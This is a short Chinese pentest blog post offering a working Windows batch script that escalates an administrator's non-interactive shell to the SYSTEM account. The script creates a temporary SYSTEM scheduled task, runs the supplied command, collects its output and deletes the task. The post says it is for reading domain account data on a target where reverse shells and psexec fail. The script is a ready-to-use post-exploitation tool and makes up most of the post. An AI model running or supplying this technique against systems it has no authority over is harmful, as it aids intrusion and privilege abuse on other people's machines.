---
title: runassystem bat实现
date: 2017-6-11 00:12
tags: pentest
---

该工具仅用作拥有administrator帐户以及非交互环境
交互环境下有多种方式获取system权限 如nircmd.exe psexec wimi sc ...

![2019-07-20-17-08-05](https://wolvez.oss-cn-hangzhou.aliyuncs.com/520e73427ccbf757a633ebd5778ddfe2.png)
![2019-07-20-17-08-16](https://wolvez.oss-cn-hangzhou.aliyuncs.com/f739c3b320977fda83545722615c1629.png)


```bat
@echo off
ver|findstr "5\.[0-9]\.[0-9][0-9]*" >NUL 2>NUL && (echo [-] Not Working for winxp\win2k3 &&goto :EOF)
del /f /q %result_file% >NUL 2>NUL
Rd "%WinDir%\system32\test_permissions" >NUL 2>NUL
Md "%WinDir%\System32\test_permissions" 2>NUL||(Echo.& [-] Echo Run as administrator user. &&goto :EOF)

set comands=%*
if not defined comands (
    echo.
    echo Run as SYSTEM  Account Tool
    echo.
    echo [-] error: The syntax of the command is incorrect.
    echo.
    echo Help:
    echo       %~n0 command 
    goto :EOF
    )

set result_file=%tmp%\command_result.txt

schtasks.exe /create /ru "SYSTEM" /tn "runAsSystem" /sc DAILY /tr "cmd.exe /c chcp 437>NUL 2>NUL&&%comands%>> %result_file%" /F >NUL 2>NUL
schtasks.exe /run   /tn runAsSystem /i >NUL 2>NUL
chcp 437>NUL 2>NUL&& schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running"  >NUL 2>NUL && (goto :Running ) || ( goto :Ready)

:Ready
type %result_file%
schtasks.exe  /delete /tn runAsSystem /f >NUL 2>NUL
del /f /q %result_file% >NUL 2>NUL
goto :EOF

:Running
TIMEOUT /T 1 >NUL 2>NUL
chcp 437>NUL 2>NUL&& schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running"  >NUL 2>NUL && (goto :Running ) || ( goto :Ready)
goto :EOF

:EOF
```

场景：
当前为本地administrator 本地帐号想查看域帐号信息(需域帐号权限或system帐号) 但当前**shell**非交互也无法反弹找了几款发现仅支持 **Vista**以下系统**psexec**倒是可以非交互下使用 但是目标系统执行出错,利用wmi也不行
`nircmd.exe elevatecmd runassystem cmd.exe` 非交互环境下不行

所以利用schtasks命令写一个批处理来实现非交互环境下 administrator 转 system用户